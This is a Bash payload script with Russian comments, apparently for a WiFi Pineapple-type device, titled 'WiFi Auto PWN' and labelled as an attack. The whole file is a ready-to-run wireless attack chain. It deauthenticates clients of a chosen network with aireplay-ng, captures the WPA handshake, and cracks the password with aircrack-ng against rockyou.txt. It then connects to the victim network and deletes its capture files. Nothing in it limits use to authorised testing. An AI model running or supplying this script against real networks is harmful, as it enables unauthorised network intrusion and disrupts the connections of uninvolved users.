#!/bin/bash
# Title: WiFi Auto PWN
# Author: LordKoks
# Description: Деаутентифицирует клиента выбранной сети, захватывает handshake и подключается к сети после взлома пароля
# Category: attack

. /root/payloads/library/nullsec-iface.sh 2>/dev/null || . "$(dirname "$0")/../../../lib/nullsec-iface.sh"
nullsec_require_iface || exit 1

LOOT_DIR="/root/loot/handshakes"
mkdir -p "$LOOT_DIR"

# ==================== ШАГ 1: Выбор сети ====================
PROMPT "WiFi Auto PWN

Выберите целевую сеть
из результатов Recon.

Убедитесь, что Recon
запущен и видит цель."

# Получаем список сетей из Recon
RECON_FILE="/tmp/recon_scan.csv"
cat /dev/null > "$RECON_FILE"

# Запрашиваем у pineapd текущие результаты сканирования
curl -s http://localhost:1471/api/recon/scan > "$RECON_FILE" 2>/dev/null

if [ ! -s "$RECON_FILE" ]; then
    ERROR_DIALOG "Результаты Recon пусты.\nЗапустите Recon и повторите."
    exit 1
fi

# Парсим и показываем список
TARGETS=$(tail -n +2 "$RECON_FILE" | awk -F',' '{print $1","$14","$4}' | head -10)
if [ -z "$TARGETS" ]; then
    ERROR_DIALOG "Нет доступных сетей."
    exit 1
fi

# Выбор цели
BSSID=$(echo "$TARGETS" | awk -F',' '{print $1}' | head -1)
CHANNEL=$(echo "$TARGETS" | awk -F',' '{print $3}' | head -1)
ESSID=$(echo "$TARGETS" | awk -F',' '{print $2}' | head -1)

PROMPT "ЦЕЛЬ ВЫБРАНА

BSSID: $BSSID
ESSID: $ESSID
Канал: $CHANNEL

Начинаем атаку?"

# ==================== ШАГ 2: Выбор клиента ====================
CLIENTS_FILE="/tmp/recon_clients.csv"
curl -s "http://localhost:1471/api/recon/ap/$BSSID/clients" > "$CLIENTS_FILE" 2>/dev/null

CLIENT_MAC=""
if [ -s "$CLIENTS_FILE" ]; then
    CLIENT_COUNT=$(tail -n +2 "$CLIENTS_FILE" | wc -l)
    if [ "$CLIENT_COUNT" -gt 0 ]; then
        CLIENT_MAC=$(tail -n +2 "$CLIENTS_FILE" | head -1 | awk -F',' '{print $1}')
        PROMPT "ВЫБРАН КЛИЕНТ

MAC: $CLIENT_MAC

Деаутентификация начнётся
после подтверждения."
    else
        PROMPT "НЕТ КЛИЕНТОВ

Будет выполнена широковещательная
деаутентификация."
    fi
else
    PROMPT "НЕТ КЛИЕНТОВ

Будет выполнена широковещательная
деаутентификация."
fi

# ==================== ШАГ 3: Деаутентификация ====================
SPINNER_START "Деаутентификация..."

# Настраиваем интерфейс на нужный канал
iwconfig "$IFACE" channel "$CHANNEL"

if [ -n "$CLIENT_MAC" ]; then
    # Деаутентификация конкретного клиента
    aireplay-ng --deauth 10 -a "$BSSID" -c "$CLIENT_MAC" "$IFACE" 2>/dev/null &
    DEAUTH_PID=$!
else
    # Широковещательная деаутентификация
    aireplay-ng --deauth 10 -a "$BSSID" "$IFACE" 2>/dev/null &
    DEAUTH_PID=$!
fi

sleep 15
kill $DEAUTH_PID 2>/dev/null

# ==================== ШАГ 4: Захват рукопожатия ====================
SPINNER_START "Захват рукопожатия..."

airodump-ng --bssid "$BSSID" -c "$CHANNEL" -w "$LOOT_DIR/capture" "$IFACE" 2>/dev/null &
AIRODUMP_PID=$!

# Ждём появления handshake
TIMEOUT=120
COUNT=0
while [ $COUNT -lt $TIMEOUT ]; do
    if grep -q "WPA handshake" "$LOOT_DIR/capture-01.log" 2>/dev/null; then
        SPINNER_STOP
        ALERT "Handshake захвачен!"
        break
    fi
    sleep 2
    COUNT=$((COUNT + 2))
done

kill $AIRODUMP_PID 2>/dev/null

# Конвертируем в формат 22000 для hashcat
if [ -f "$LOOT_DIR/capture-01.cap" ]; then
    hcxpcapngtool -o "$LOOT_DIR/handshake.22000" "$LOOT_DIR/capture-01.cap" 2>/dev/null
    SPINNER_STOP
    ALERT "Handshake сохранён в $LOOT_DIR/handshake.22000"
else
    ERROR_DIALOG "Не удалось захватить handshake."
    exit 1
fi

# ==================== ШАГ 5: Попытка взлома и подключения ====================
PROMPT "HANDSHAKE ЗАХВАЧЕН

Файл: $LOOT_DIR/handshake.22000

Попытаться подобрать пароль
и подключиться к сети?

Для этого необходим словарь
rockyou.txt на SD-карте."

# Проверяем наличие словаря
if [ ! -f /mmc/root/rockyou.txt ]; then
    PROMPT "СЛОВАРЬ НЕ НАЙДЕН

Поместите rockyou.txt в /mmc/root/

Скопируйте файл handshake.22000
на ПК и взломайте через hashcat."
    exit 0
fi

SPINNER_START "Подбор пароля..."

# Простой перебор через aircrack (без OpenCL)
aircrack-ng -w /mmc/root/rockyou.txt -l /tmp/cracked_key.txt "$LOOT_DIR/capture-01.cap" 2>/dev/null &
CRACK_PID=$!
sleep 30
kill $CRACK_PID 2>/dev/null

if [ -f /tmp/cracked_key.txt ] && [ -s /tmp/cracked_key.txt ]; then
    PSK=$(cat /tmp/cracked_key.txt)
    SPINNER_STOP
    ALERT "Пароль найден: $PSK"

    # Подключаемся к сети
    SPINNER_START "Подключение к $ESSID..."
    
    cat > /tmp/wpa_supplicant.conf << EOF
network={
    ssid="$ESSID"
    psk="$PSK"
}
EOF

    wpa_supplicant -i wlan0cli -c /tmp/wpa_supplicant.conf -B 2>/dev/null
    sleep 5
    udhcpc -i wlan0cli -t 5 -n 2>/dev/null
    
    SPINNER_STOP
    
    IP=$(ifconfig wlan0cli 2>/dev/null | grep 'inet addr' | awk -F: '{print $2}' | awk '{print $1}')
    
    if [ -n "$IP" ]; then
        ALERT "ПОДКЛЮЧЕНИЕ УСПЕШНО!

SSID: $ESSID
Пароль: $PSK
IP: $IP"
    else
        ERROR_DIALOG "Не удалось подключиться."
    fi
else
    SPINNER_STOP
    PROMPT "ПАРОЛЬ НЕ НАЙДЕН

Скопируйте handshake.22000
на ПК и используйте hashcat
с более мощным словарём."
fi

# Очистка
rm -f /tmp/cracked_key.txt /tmp/recon_scan.csv /tmp/recon_clients.csv /tmp/wpa_supplicant.conf
rm -f "$LOOT_DIR/capture-01.cap" "$LOOT_DIR/capture-01.csv" "$LOOT_DIR/capture-01.kismet.csv" "$LOOT_DIR/capture-01.log"

exit 0